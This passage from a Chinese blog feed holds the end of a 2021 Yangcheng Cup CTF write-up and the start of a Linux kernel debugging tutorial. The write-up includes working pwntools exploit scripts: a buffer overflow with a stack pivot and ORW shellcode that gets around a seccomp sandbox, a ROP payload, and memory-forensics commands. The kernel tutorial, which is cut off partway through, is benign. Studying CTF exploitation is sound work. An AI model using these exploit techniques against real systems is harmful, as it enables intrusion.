class=""><p>那么我们的目标就是很明确了，就是把s改成我们想要读取的文件，比如<code>flag</code>，溢出点就在<code>rename</code>里面，它先把一个变量地址（<code>&amp;v5</code>）传进去，但是进去之后读取23个字节，人家才<code>int_64</code>，你就读23字节进去肯定溢出</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/image-20210913160104319.png" class=""><p>结果很明显，我们可以cat flag到result里面了</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/8.jpg" class=""><p>然后去<code>admin</code>看看，<code>seccomp</code>里面是沙箱，不截图了，禁用了<code>execve</code>，然后就有了<code>orw</code>的想法，并且下面也<code>open</code>了提示已经很明显了，我太菜了没悟出来，</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/9.png" class=""><p>里面有溢出点，具体偏移要手调，但是这里才<code>0x1D</code>的大小，明显不够些<code>read</code>和<code>write</code>的<code>shellcode</code>，那就只能调用<code>sys_read</code>，再读入我们的<code>rw</code>，可恶啊！学到了！</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/10.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;./nologin&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;11000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;192.168.39.184&quot;</span>,port)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;input&gt;&gt; \n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;user1&gt;&gt; \n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x19</span>-<span class="number">0x4</span>)+<span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;input file name:\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;input&gt;&gt; \n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;password: &#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *0x400a0e&quot;)</span></span><br><span class="line">jmp_esp=<span class="number">0x00000000004016fb</span></span><br><span class="line">shellcode=<span class="string">&#x27;mov eax,0;mov edx,200;syscall&#x27;</span></span><br><span class="line"><span class="comment">#用jmp esp劫持控制流到栈上</span></span><br><span class="line">payload=asm(shellcode).ljust(<span class="number">0xd</span>,<span class="string">&#x27;a&#x27;</span>)+p64(jmp_esp)+asm(<span class="string">&#x27;mov bx,21;sub rsp,rbx;jmp rsp&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">shellcode=<span class="string">&#x27;mov edx,200;mov rdi,3;mov rax,0;syscall;mov rdi,1;mov rax,1;syscall;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"><span class="comment">#加上0x30是填充之前的指令，因为当前的ip指向0x30这个位置</span></span><br><span class="line">payload=<span class="string">&#x27;c&#x27;</span>*<span class="number">0x30</span>+asm(shellcode)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="BabyROP"><a href="#BabyROP" class="headerlink" title="BabyROP"></a>BabyROP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;BabyRop&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">binary = <span class="string">&#x27;BabyRop&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;11000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;192.168.39.184&quot;</span>,port)</span><br><span class="line"></span><br><span class="line">sh = <span class="number">0x804c029</span></span><br><span class="line">put_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_got = <span class="number">0x80491D6</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(sys_got)+<span class="string">&#x27;zyen&#x27;</span>+p32(sh))</span><br><span class="line"></span><br><span class="line"><span class="comment"># puts_got = u32(io.recvuntil(&#x27;\x7f&#x27;)[-4:])</span></span><br><span class="line"><span class="comment"># print(hex(put_got))</span></span><br><span class="line"><span class="comment"># io.sendline(&#x27;\x00\x6a&#x27;+shellcode)</span></span><br><span class="line"><span class="comment"># io.recv(10)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="Baby–forenisc"><a href="#Baby–forenisc" class="headerlink" title="Baby–forenisc"></a>Baby–forenisc</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./volatility_2.6_lin64_standalone -f 1.raw --profile=WinXPSP2x86 cmdscan</span><br></pre></td></tr></table></figure><p>其他都扫了一边只有这个有信息，它提示把<code>flag</code>放到<code>git</code>上了</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/image-20210913184100548.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./volatility_2.6_lin64_standalone -f 1.raw --profile=WinXPSP2x86 filescan | grep -E <span class="string">&#x27;txt&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/13.png" class=""><p>把它<code>dump</code>出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./volatility_2.6_lin64_standalone -f 1.raw --profile=WinXPSP2x86 dumpfiles -Q 0x00000000020bf6a0 -D ./</span><br></pre></td></tr></table></figure><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/14.png" class=""><p>放到<code>putty genera</code></p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/11.png" class=""><p>获取一个邮箱，之前说<code>flag</code>再<code>git</code>上我们直接<code>github</code>上搜</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/15.png" class=""><p>文件打开翻一下找到，官方<code>wp</code>说这是一个微信小程序的文件，本来是需要通过工具进行解包的，但是没想到<code>flag</code>以<code>base64</code>的形式写到这里面了…</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/16.png" class=""><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/17.png" class="">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>和kernel说个Hello吧！（一）</title>
      <link href="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<blockquote><p>或许是最近飘了，想开始学习内核了，看到《庖丁解牛linux内核》这本书之后，萌发了一个调试内核的想法，所以这个系列应运而生，在最开始学习计算机的时候，都是从写Hello World！开始的，所以当我开始内核的时候，也想着延续这个传统（其实的听到<code>xuanxuan</code>老师讲到的😀），这篇文章是我第一次接触内核所写的文章，其实一直以来我都在好奇，如此庞大的操作系统到底是怎么启动起来的，本文旨在通过调试从<code>start_kernel</code>到<code>init</code>进程启动的过程来了解<code>linux</code>到底是怎么样启动起来的，如果你也想知道这个问题的答案，那就跟我看下去吧！</p></blockquote><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>要想调试首先就得有一个<code>linux</code>来调对不对，先搭建一个简单的<code>linux</code>内核，通过编译内核代码加上根文件系统来构建一个简单的操作系统，先去下载<a href="https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.18.6.tar.xz"><code>linux</code>内核源码</a>，虚拟机的网络（可能是源的问题吧）实在不太行，下载完成之后千万千万要注意不要在<code>windows</code>下面解压，因为在<code>linux</code>源码里面有个文件叫<code>aux.c</code>，这玩意和<code>windows</code>下的设备名为同一个名字，解压出来之后，会删除不了此文件，如果真的一不小心解压出来了，下面为解决办法，解铃还需系铃人啊！：</p><p><a href="https://www.191e.com/pc/23327.html">win10系统下aux.c、aux.h格式文件无法删除的解决方法</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir kernel</span><br><span class="line"><span class="built_in">cd</span> kernel</span><br><span class="line"><span class="comment">#把linux源码放进kernel文件夹</span></span><br><span class="line">xz -d linux-3.18.6.tar.xz </span><br><span class="line">tar -xvf linux-3.18.6.tar </span><br><span class="line"><span class="built_in">cd</span> linux-3.18.6 </span><br><span class="line">make i386_defconfig </span><br><span class="line">make </span><br></pre></td></tr></table></figure><p>开始<code>make</code>之后，又报错下面两条错，原因很明显就是确实有个文件，在<code>github</code>中找到其他人的文件放到它提示的目录中就能开始编译啦！（你也可能不缺，具体看系统的内核版本）</p><p><a href="https://github.com/murata-wireless/cyw-fmac/tree/master/backport-include/linux">compiler-gcc</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include/linux/compiler-gcc.h:106:1: fatal error: linux/compiler-gcc9.h: 没有那个文件或目录</span><br><span class="line"></span><br><span class="line">include/linux/compiler-gcc9.h:1:10: fatal error: linux/compiler-gccN.h: 没有那个文件或目录</span><br></pre></td></tr></table></figure><p><code>make</code>是个漫长的过程，需要静静等待….</p><p>编译完成之后就是搭建根文件系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ..<span class="comment">#退出到kernel目录</span></span><br><span class="line">mkdir rootfs</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mengning/menu.git  <span class="comment">#把menuOS的源码拉下来</span></span><br><span class="line"><span class="built_in">cd</span> menu</span><br><span class="line">gcc -o init linktable.c menu.c test.c -m32 -static –lpthread</span><br><span class="line"><span class="built_in">cd</span> ../rootfs</span><br><span class="line">cp ../menu/init ./</span><br><span class="line">find . | cpio -o -Hnewc |gzip -9 &gt; ../rootfs.img</span><br></pre></td></tr></table></figure><p>报这个错在命令行输入：<code>apt install gcc-multilib</code>就行了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal error: bits/libc-header-start.h: 没有那个文件或目录</span><br></pre></td></tr></table></figure><p>外事具备！接下来就是启动它了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel linux-3.18.6/arch/x86/boot/bzImage -initrd rootfs.img -append <span class="string">&quot;console=ttyS0&quot;</span> -nographic</span><br></pre></td></tr></table></figure><p>上面命令的解释：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64  <span class="comment">#qemu的system模式进行全量模拟，架构为x64</span></span><br><span class="line">-kernel <span class="comment">#指定内核镜像的位置</span></span><br><span class="line">-initrd <span class="comment">#根文件系统的位置</span></span><br><span class="line">-append <span class="string">&quot;console=ttyS0&quot;</span>  <span class="comment">#启动后传入的参数</span></span><br><span class="line">-nographic<span class="comment">#在本地终端启动</span></span><br></pre></td></tr></table></figure><p>之后就可以看到<code>menuOS</code>启动起来了！虽然这个比较顺利但还是泪目了：</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/1.png" class=""><p>但是此处的<code>menuOS</code>是不包含调试信息的，需要重新编译让它包含调试信息，我们进到<code>linux-3.18.6</code>文件里面输入<code>make menuconfig </code>会进入下面的页面</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/2.png" class=""><p>根据以下路径修改使得编译的时候附上调试信息：</p><p><code>kernel hacking  —&gt; Compile-time checks and compiler options -&gt; compile the kernel with debug info</code>（对它按<code>y</code>就能打开调试信息）</p><p>之后再<code>make</code>就可以重新编译啦！</p><p>又是一段漫长的时光….</p><h3 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h3><blockquote><p>使用 <code>gdb</code> 跟踪调试内核，加两个参数，一个是<code>-s</code>（在 1234 端口上创建了一个 <code>gdb-server</code>， 读者可以另外打开一个窗口，用 <code>gdb</code> 把带有符号表的内核镜像加载进来，然后连接 <code>gdb-server</code>，设置断点跟踪内核。若不想使用 1234 端口，可以使用<code>-gdb tcp:xxxx</code> 来取代<code>-s</code> 选项）， 另一个是<code>-S</code>（CPU 初始化之前冻结起来）</p></blockquote><p>在之前的命令当中加上<code>-S -s</code>参数就可以让内核停下来等待连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel linux-3.18.6/arch/x86/boot/bzImage -initrd rootfs.img -append &quot;console=ttyS0&quot; -nographic -S -s</span><br></pre></td></tr></table></figure><p>之后就能用<code>gdb</code>连上了：</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/3.png" class=""><p>一连接发现报错了，仔细一看是架构出现了问题，<code>set architecture i386:x86-64</code>即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote:1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">warning: Selected architecture i386 is not compatible with reported target architecture i386:x86-64</span><br><span class="line">warning: Architecture rejected target-supplied description</span><br><span class="line">Remote <span class="string">&#x27;g&#x27;</span> packet reply is too long (expected 312 bytes, got 608 bytes): 000000000000000000000000000000000000000000000000b10f060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0ff0000000000000200000000f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007f0300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000801f0000</span><br></pre></td></tr></table></figure><p>这里还看到一些很奇怪的玩意：<code>i386:x86-64</code>其实就是<code>x64</code>，名字不同罢了，<code>i386:x86-64:intel</code>估摸着应该是汇编的格式不同，但这个就很离谱了，<code>i386:x64-32</code>，惊奇！！！<code>x64</code>居然还有32位的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture </span><br><span class="line">Requires an argument. Valid arguments are i386, i386:x86-64, i386:x64-32, i8086, i386:intel, i386:x86-64:intel, i386:x64-32:intel, i386:nacl, i386:x86-64:nacl, i386:x64-32:nacl, auto.</span><br></pre></td></tr></table></figure><p>其实就是为了节省内存所衍生出来的产物，但好像不太常见，至少现在没见过….</p><blockquote><p>寄存器是 64 位的，但指针只有 32 位，在大量指针的工作流中节省了大量内存。它还确保所有其他仅 64 位处理器功能可用。</p></blockquote><p>再次连接就进入了调试界面，可以看到此处第一条指令是<code>0xfff0</code>：</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/4.png" class=""><p>至此就可以正常的进行调试了，接下来将展现<code>linux</code>操作系统启动的方方面面，看到这里，你可能会疑惑为什么是从<code>start_kernel</code>开始调试，你可能会说它就是内核的起点，一切的一切都从这里开始，说的对，但也不对，因为如果说一切的一切都从这里开始的话，那进入<code>start_kernel</code>的栈是哪里来的？断点打在<code>start_kernel</code>上按下<code>c</code>的时候为什么处在冻结状态的内核会闪过一些字符？所以它并不是一切的起点，再次之前还有很多用汇编编写的代码来完成硬件系统的初始化工作，为 C 代码的运行设置环境，那为啥还是得从<code>start_kernel</code>开始调试呢？因为之前都是硬件层面的初始化，在这我们真正想研究或者说想弄明白的是如此庞大的操作系统到底是怎么样启动起来的！并且在这留下几个问题：</p><ul><li><code>idle</code>进程是什么，它是怎么来的，它的作用是什么？</li><li>0号进程是什么？1号呢？2号呢？1号进程和2号进程的作用又是什么呢？</li><li>内核启动完成以后处于一个什么状态当中？</li></ul><p>下面是它的源码，可以看到有很多初始化，包括<code>trap_init</code>（中断向量的初始化），<code>mm_init</code> （内存管理模块的初始化）等等….只能选择几个比较重要的来分析并解决上面的问题（毕竟能力有限很多东西还得再沉淀沉淀才能搞明白）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage __visible <span class="keyword">void</span> __init <span class="title">start_kernel</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">lockdep_init();<span class="comment">//检查内核死锁问题</span></span><br><span class="line">set_task_stack_end_magic(&amp;init_task);<span class="comment">//给栈底加个标志防止溢出</span></span><br><span class="line">smp_setup_processor_id();<span class="comment">//获取CPU硬件ID</span></span><br><span class="line">debug_objects_early_init();</span><br><span class="line"></span><br><span class="line">boot_init_stack_canary();<span class="comment">//初始化canary</span></span><br><span class="line">cgroup_init_early();</span><br><span class="line">local_irq_disable();<span class="comment">//关闭IRQ中断</span></span><br><span class="line">early_boot_irqs_disabled = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">boot_cpu_init();<span class="comment">//激活BOOT CPU</span></span><br><span class="line">page_address_init();</span><br><span class="line">pr_notice(<span class="string">&quot;%s&quot;</span>, linux_banner);<span class="comment">//打印系统内核的一些信息</span></span><br><span class="line">setup_arch(&amp;command_line);</span><br><span class="line">mm_init_cpumask(&amp;init_mm);</span><br><span class="line">setup_command_line(command_line);</span><br><span class="line">setup_nr_cpu_ids();</span><br><span class="line">setup_per_cpu_areas();</span><br><span class="line">smp_prepare_boot_cpu();<span class="comment">/* arch-specific boot-cpu hooks */</span></span><br><span class="line"></span><br><span class="line">build_all_zonelists(<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">page_alloc_init();</span><br><span class="line"></span><br><span class="line">pr_notice(<span class="string">&quot;Kernel command line: %s\n&quot;</span>, boot_command_line);</span><br><span class="line">parse_early_param();</span><br><span class="line">after_dashes = parse_args(<span class="string">&quot;Booting kernel&quot;</span>,</span><br><span class="line">  static_command_line, __start___param,</span><br><span class="line">  __stop___param - __start___param,</span><br><span class="line">  <span class="number">-1</span>, <span class="number">-1</span>, &amp;unknown_bootoption);</span><br><span class="line"><span class="keyword">if</span> (!IS_ERR_OR_NULL(after_dashes))</span><br><span class="line">parse_args(<span class="string">&quot;Setting init args&quot;</span>, after_dashes, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>,</span><br><span class="line">   set_init_arg);</span><br><span class="line"></span><br><span class="line">jump_label_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * These use large bootmem allocations and must precede</span></span><br><span class="line"><span class="comment"> * kmem_cache_init()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">setup_log_buf(<span class="number">0</span>);</span><br><span class="line">pidhash_init();</span><br><span class="line">vfs_caches_init_early();</span><br><span class="line">sort_main_extable();<span class="comment">//对内核异常表进行排序</span></span><br><span class="line">trap_init();</span><br><span class="line">mm_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Set up the scheduler prior starting any interrupts (such as the</span></span><br><span class="line"><span class="comment"> * timer interrupt). Full topology setup happens at smp_init()</span></span><br><span class="line"><span class="comment"> * time - but meanwhile we still have a functioning scheduler.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">sched_init();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Disable preemption - early bootup scheduling is extremely</span></span><br><span class="line"><span class="comment"> * fragile until we cpu_idle() for the first time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">preempt_disable();</span><br><span class="line"><span class="keyword">if</span> (WARN(!irqs_disabled(),</span><br><span class="line"> <span class="string">&quot;Interrupts were enabled *very* early, fixing 